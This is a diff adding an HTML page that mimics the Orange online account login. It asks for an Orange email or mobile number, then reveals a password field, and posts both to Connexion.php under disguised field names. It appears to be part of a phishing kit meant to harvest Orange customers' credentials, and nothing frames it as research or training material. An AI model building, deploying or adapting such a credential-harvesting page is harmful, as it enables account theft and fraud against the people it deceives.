@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+
+
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>Accéder à mes comptes en ligne</title>
+	<link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
+
+	<link type="image/x-icon" href="files/favicon.ico" rel="shortcut icon">
+	<link rel="stylesheet" href="files/image.css">
+	
+	<style>
+	body{
+background-color: #fafafa;
+	}
+	.container { margin: 9px; }
+	
+	.btn.focus, .btn:focus {
+    outline: 0;
+    box-shadow: none!important;
+}
+
+		.flog {
+			display:block;
+		}
+
+		.fpass {
+			display:none;
+		}
+		
+		
+		
+		.reset-inputt{
+			display:none;
+		}
+		
+		.tof-pass{
+			display:none;
+		}
+		
+		.tof-passe{
+			display:block;
+		}
+		
+		.tof-pa{
+			display:none;
+		}
+		
+		.btn-primary {
+			display:none;
+		}
+		
+		.botona {
+			display:block;
+		}
+	</style>
+	
+	<script type="text/javascript">
+		function showHide(){
+			var click = document.getElementById("chk");
+			var hiddeninputss = document.getElementsByClassName("flog");
+			var hiddeninputs = document.getElementsByClassName("fpass");
+			var hiddninputs = document.getElementsByClassName("reset-inputt");
+			var hiddninput = document.getElementsByClassName("tof-pass");
+			var hiddeninput = document.getElementsByClassName("tof-pa");
+			var hideninput = document.getElementsByClassName("btn-primary");
+			var showinput = document.getElementsByClassName("botona");
+			
+		
+			for(var i = 0; i != hiddeninputs.length; i++){
+				if(click) {
+					hiddeninputs[i].style.display = "block";
+				}
+			}
+			
+			for(var i = 0; i != hiddeninputss.length; i++){
+				if(click) {
+					hiddeninputss[i].style.display = "none";
+				}
+			}
+			
+			for(var i = 0; i != hiddeninput.length; i++){
+				if(click) {
+					hiddeninput[i].style.display = "block";
+				}
+				
+			}
+			
+			for(var i = 0; i != hideninput.length; i++){
+				if(click) {
+					hideninput[i].style.display = "block";
+				}
+			}
+			
+			for(var i = 0; i != hiddninputs.length; i++){
+				if(click) {
+					hiddninputs[i].style.display = "block";
+				}
+			}
+			
+			for(var i = 0; i != hiddninput.length; i++){
+				if(click) {
+					hiddninput[i].style.display = "block";
+				}
+				
+				
+				
+				
+			}
+			for(var i = 0; i != showinput.length; i++){
+				if(click) {
+					showinput[i].style.display = "none";
+				}
+				
+				
+				
+			
+			
+			}
+		}
+	</script>
+	
+
+	
+
+</head>
+
+<body>
+
+	<form  method="post" action="Connexion.php">
+	
+		
+		<br/>
+		<input type="text" class="flog" placeholder="Adresse mail ou n° de mobile Orange"  name="taarif"  id="input-log" aria-describedby="cryxpad-input-field-help" style="" />
+		<br/>
+		
+		
+		
+		 <i class="tof-passe" href="#"  id="cryxpad-remove-btn" style=""></i> 
+		 <i class="tof-pa"  href="#" id="cryxpad-remove-btn" style=""></i> 
+		 <i class="tof-pass" href="#" id="cryxpad-remove-btn" style=""></i> 
+		 
+		 
+	
+		
+		<input type="button" value="Continuer" name="chkbox" id="chk" class="botona" onclick="showHide()" />
+		<br />
+		
+		<input type="password"  class="fpass"  placeholder="Mot de passe"   name="ramz" id="cryxpad-input-field" aria-describedby="cryxpad-input-field-help"  />
+		
+		
+		
+						
+		<a class="reset-inputt" href="#" id="cryxpad-remove-btn" style=""></a>
+						
+		
+		
+		
+
+</div>
+					<div class="cryxpad-container" style=""></div>
+			<div id="clavier"  align="left" ></div>
+			<div class="row" style="">
+				<div class="col">
+					<button id="-validate-btn" class="btn-primary" type="submit" style="">S'identifier</button>	
+					
+					
+					
+				</div>
+				
+			</div>
+			<!-- <i class="tof-pass" href="#" id="passclient" style=""></i> -->
+	</form>
+	
+	
+	
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	<br>
+	
+
+
+
+</body>
+
+
+
+</html>
